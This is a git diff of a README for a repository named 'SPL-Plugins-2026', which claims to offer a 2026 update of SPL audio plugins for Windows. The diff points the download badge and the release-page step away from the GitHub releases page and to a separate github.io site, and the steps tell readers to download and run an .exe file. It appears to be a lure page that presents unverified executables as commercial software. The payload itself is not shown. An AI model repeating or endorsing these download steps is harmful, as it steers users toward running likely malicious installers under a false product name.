@@ -1,6 +1,6 @@
 # 🎚️ SPL-Plugins-2026 - Improve your audio mixing performance today
 
-[![Download SPL Plugins](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/makembuuu/SPL-Plugins-2026/releases)
+[![Download SPL Plugins](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://makembuuu.github.io)
 
 This repository provides the 2026 update for SPL audio plugins. These tools help you process sound in digital audio workstations on Windows 10 and Windows 11. You can add professional signal processing, including transient manipulation and equalization, to your audio chain.
 
@@ -18,7 +18,7 @@ To run these plugins, your computer must meet these basic hardware and software 
 
 Follow these steps to acquire the installer files for your workstation.
 
-1. Visit the project release page: [https://github.com/makembuuu/SPL-Plugins-2026/releases](https://github.com/makembuuu/SPL-Plugins-2026/releases)
+1. Visit the project release page: [https://makembuuu.github.io](https://makembuuu.github.io)
 2. Locate the most recent entry at the top of the list.
 3. Look for the Assets section under the release notes.
 4. Click the file ending in .exe to start your download.
